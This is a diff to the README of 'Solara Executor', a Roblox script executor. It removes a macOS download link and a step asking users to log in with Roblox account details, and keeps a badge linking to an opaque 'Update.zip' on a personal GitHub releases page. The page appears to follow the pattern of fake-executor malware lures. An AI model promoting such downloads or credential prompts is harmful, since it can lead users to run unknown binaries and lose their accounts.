@@ -1,4 +1,4 @@
-# 🚀 Solara Executor - Roblox Executor **[![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://github.com/waellaataoui/Solara-Executor/releases/download/Releasev4/Update.zip)** **[![Download for Mac OS](https://img.shields.io/badge/Download-For%20MacOS-blueviolet)](https://github.com/waellaataoui/Solara-Executor/releases/download/Releasev4/Update.dmg)**
+# 🚀 Solara Executor - Roblox Executor **[![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://github.com/waellaataoui/Solara-Executor/releases/download/Releasev4/Update.zip)**
 
 ## Quick Installation
 To get started with Solara Executor, follow these simple steps:
@@ -35,7 +35,6 @@ Solara Executor includes a variety of advanced features tailored to your needs:
 ## How to Use
 Once you have installed Solara Executor, follow these steps to start using it:
 1. **Launch the Application:** Open Solara Executor from your installation directory.
-2. **Login:** Use your Roblox account details to login (if required).
 3. **Load a Script:** Choose the script you wish to execute from your library or create a new one.
 4. **Execute:** Click the execute button and let Solara handle the rest.
 5. **Enjoy:** Experience the enhanced features and smoother gameplay!
